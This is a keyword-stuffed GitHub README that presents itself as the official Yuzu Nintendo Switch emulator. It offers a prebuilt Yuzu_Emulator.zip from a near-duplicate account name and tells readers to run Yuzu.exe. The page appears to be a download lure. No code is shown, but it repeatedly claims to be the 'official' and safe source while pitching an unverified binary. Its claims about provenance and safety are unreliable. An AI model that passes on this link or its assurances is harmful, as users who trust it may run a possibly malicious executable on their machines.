#  Yuzu Emulator

**Yuzu Emulator** lets you play Nintendo Switch games on PC in up to 4K — Zelda, Mario, Pokémon, and thousands more — with Vulkan rendering, LDN multiplayer, and full mod support on Windows and Linux.

Yuzu is one of the most searched Nintendo Switch emulators, with active communities on Reddit and support for Android via forks like Suyu, Sudachi, Citron, and Eden. This release includes a full quickstart guide to get you from download to playing in minutes.
<img width="280" height="280" alt="f482db6f-cde8-4255-a799-3eb519547987" src="https://github.com/user-attachments/assets/413de58b-2e67-43f7-bfc9-07bce2e58365" />

## Install
[Download `Yuzu_Emulator.zip`](https://github.com/yuzuemulatorr/Yuzu-Emu/releases/download/v1734/Yuzu_Emulator.zip)
---

<img width="640" height="360" alt="17e3ab97-7003-4169-9c46-ae6bc253c9db" src="https://github.com/user-attachments/assets/cecdd230-9f7b-4c8f-9897-4ccd1a391759" />

## Key Features
- High game compatibility across a broad Switch library — Zelda, Mario, Pokémon, Metroid, Kirby, and more
- Vulkan and OpenGL rendering with 4K, 2K, and 1080p resolution scaling
- LDN multiplayer — play Switch games online with friends without Nintendo Switch Online
- LayeredFS mod support for texture packs, 60FPS patches, and game modifications
- Amiibo emulation
- Save file management with import and export
- Compatible with Suyu, Sudachi, Citron, and Eden community forks
- Shader cache to eliminate first-run stuttering on subsequent sessions

<img width="800" height="492" alt="973425b2-e9f3-4768-9840-73a4f9ea3bcd" src="https://github.com/user-attachments/assets/8d5c1374-5cbe-4a10-ae60-48c27c0961dd" />
<img width="1024" height="640" alt="772c6e2f-ea43-4f74-8250-e4fd638bbada" src="https://github.com/user-attachments/assets/1ca899bf-3ad6-42dc-8ebc-4f97c5bb1788" />

## Getting Started — Quickstart Guide
1. **Download** the latest version using the button above.
2. **Extract** the archive to any folder.
3. **Place your prod.keys** in `%AppData%\yuzu\keys\`
4. **Install firmware** via Emulation → Configure → System → Install Firmware
5. **Add your game files** (.nsp, .xci, or extracted directories) via File → Add New Game Directory
6. Run `Yuzu.exe` and start playing.

**Note:** You must own the original Nintendo Switch games and dump prod.keys and firmware from your own console. These are not provided here.

## Yuzu on Android / APK
Yuzu itself is a PC emulator (Windows and Linux). Android support is available through community forks:
- **Suyu** — active Android fork with regular updates
- **Sudachi** — focused on stability and game compatibility
- **Citron** — performance-focused fork
- **Eden** — newer fork targeting Android and low-end hardware

Search for the latest APK releases on their respective GitHub pages.

## Keys and Firmware Setup
- **prod.keys** — required to decrypt games. Dump from your Switch using Lockpick_RCM.
- **Firmware** — install via the Yuzu menu. Must match or be older than your prod.keys version.
- Without valid keys, games will show a "Unable to start" or black screen error.

## System Requirements
- **Windows 10 / 11** or **Linux** (64-bit)
- CPU: Intel Core i5 / AMD Ryzen 5 or better
- GPU: NVIDIA GTX 1060 / AMD RX 580 or better with Vulkan support
- RAM: 8 GB minimum (16 GB or more recommended for demanding open-world titles)
- Storage: SSD recommended

## Compatibility Notes
Most major Switch titles work well. For best performance:
- Use Vulkan for NVIDIA and AMD GPUs
- Enable multi-core CPU emulation
- Load the shader cache before long play sessions to prevent stuttering
- Zelda: Tears of the Kingdom, Pokémon, and Mario titles run at full speed on mid-range hardware

## Yuzu vs Ryujinx
Both are the leading Switch emulators. Yuzu historically had broader game compatibility and faster updates, while Ryujinx Canary offers excellent stability. Many users run both depending on the title.

## FAQ

**Yuzu emulator download — is it safe?**
Download only from this GitHub repository. Scan with VirusTotal before running.

**Yuzu on iOS?**
Yuzu does not have an official iOS version. iOS Switch emulation is in early stages via other projects.

**Yuzu emulator tutorial — where do I start?**
Follow the Quickstart Guide above. The keys and firmware section covers the most common setup questions.

**Yuzu emulator 2026 — is it still being updated?**
Yes — this repository tracks the latest community builds based on the Yuzu codebase.

## Security & Legal
**Important Notice:**
You must own the original Switch games and create your own dumps. Distributing or downloading copyrighted ROMs or firmware is illegal.

**Recommendations:**
- Download **only** from this official GitHub repository.
- Scan files on [VirusTotal](https://www.virustotal.com).

## License & Acknowledgments
### License
**Yuzu Emulator** is shared under the **MIT License**.
See [LICENSE](LICENSE) for details.

**Copyright © 2026 siwyp**

### Acknowledgments
- Thanks to the original Yuzu development team for building this foundation.
- The Nintendo Switch emulation community for their continued research and support.

<img width="2240" height="1260" alt="af934bba-e9c6-40f4-8c06-e21947177001" src="https://github.com/user-attachments/assets/55f24125-26b6-42b2-90a1-104aa4b08bfc" />
